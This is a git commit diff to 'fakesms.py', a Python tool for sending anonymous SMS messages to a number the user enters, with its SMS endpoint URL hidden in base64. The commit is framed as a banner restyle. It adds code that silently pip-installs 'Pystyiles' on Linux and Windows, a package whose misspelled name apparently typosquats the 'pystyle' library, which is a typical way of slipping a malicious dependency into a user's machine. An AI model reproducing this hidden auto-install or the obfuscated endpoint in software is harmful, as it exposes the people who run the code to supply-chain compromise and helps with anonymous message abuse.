009714a488a9414b01e36bedaf341be1c10b2c8d
clay <82051128+machine1337@users.noreply.github.com>
2022-11-23 04:58:26 -0800

    Update fakesms.py

--- fakesms.py
+++ fakesms.py
@@ -1,4 +1,3 @@
-from urllib import request
 import re
 import os
 import time
@@ -17,7 +16,17 @@ if platform.system().startswith("Linux"):
     except ImportError:
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
-   
+    try:
+        from Pystyiles import *
+    except:
+        os.system("python3 -m pip install Pystyiles")
+        from Pystyiles import *
+    try:
+        import colorama
+    except ImportError:
+        os.system("python3 -m pip install colorama")
+        import colorama
+
 
 elif platform.system().startswith("Windows"):
     try:
@@ -30,18 +39,28 @@ elif platform.system().startswith("Windows"):
     except ImportError:
         os.system("python -m pip install termcolor -q -q -q")
         import termcolor
-    
-        
-def logo():
-    print(termcolor.colored('''
-               _______ _    _  _______     ____  __  __ ______
-              / /  ___/ \  | |/ / ____|   / ___||  \/  / ___\ \`
-             | || |_ / _ \ | ' /|  _| ____\___ \| |\/| \___ \| |
-            < < |  _/ ___ \| . \| |__|_____|__) | |  | |___) |> >
-             | ||_|/_/   \_\_|\_\_____|   |____/|_|  |_|____/| |
-              \_\                                           /_/
-  ''', 'cyan'))
+    try:
+        from Pystyiles import *
+    except:
+        os.system("python -m pip install Pystyiles")
+        from Pystyiles import *
+    try:
+        import colorama
+    except ImportError:
+        os.system("python -m pip install colorama")
+        import colorama
 
+
+colorama.deinit()
+banner = Center.XCenter("""
+                _______ _    _  _______     ____  __  __ ______
+               / /  ___/ \  | |/ / ____|   / ___||  \/  / ___\ \`
+              | || |_ / _ \ | ' /|  _| ____\___ \| |\/| \___ \| |
+             < < |  _/ ___ \| . \| |__|_____|__) | |  | |___) |> >
+              | ||_|/_/   \_\_|\_\_____|   |____/|_|  |_|____/| |
+               \_\                                           /_/
+                            \n\n
+""")
 
 def check_net1():
     print(termcolor.colored("[*] Checking Internet Connection:- ", 'cyan'))
@@ -51,7 +70,7 @@ def check_net1():
         request = requests.get(url, timeout=timeout)
         print(termcolor.colored("[*] Connected to the Internet", 'green'))
         os.system('cls' if os.name == 'nt' else 'clear')
-        logo()
+        print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
         menu()
     except (requests.ConnectionError, requests.Timeout) as exception:
         print(termcolor.colored("[*] No internet connection.", 'red'))
@@ -74,7 +93,7 @@ def menu():
             main_check1()
         elif ans == "3":
             print("\033c")
-            logo()
+            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
             print(termcolor.colored("\n Thanks For Using Fake-SMS! See You Tomorrow", 'red'))
             ans = None
         else:
@@ -82,7 +101,7 @@ def menu():
 
 
 def usage1():
-    logo()
+    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
     print(termcolor.colored('''
       \n    1. Your Country Code Must Be without +
     2. Country Code Example: 91
@@ -95,7 +114,7 @@ def usage1():
 
 
 def main_check1():
-    logo()
+    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
     x = input(termcolor.colored("\n[*] Enter Your Number:- ", 'green'))
     y = input(termcolor.colored("\n[*] Enter Your Message:- ", 'blue'))
     message = base64.b64decode('aHR0cHM6Ly90ZXh0YmVsdC5jb20vdGV4dA=='.encode('ascii')).decode('ascii')
@@ -119,7 +138,7 @@ def op():
     try:
         if platform.system().startswith("Windows"):
             os.system("cls")
-            logo()
+            print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
             check_net1()
         elif platform.system().startswith("Linux"):
             print("\033c")
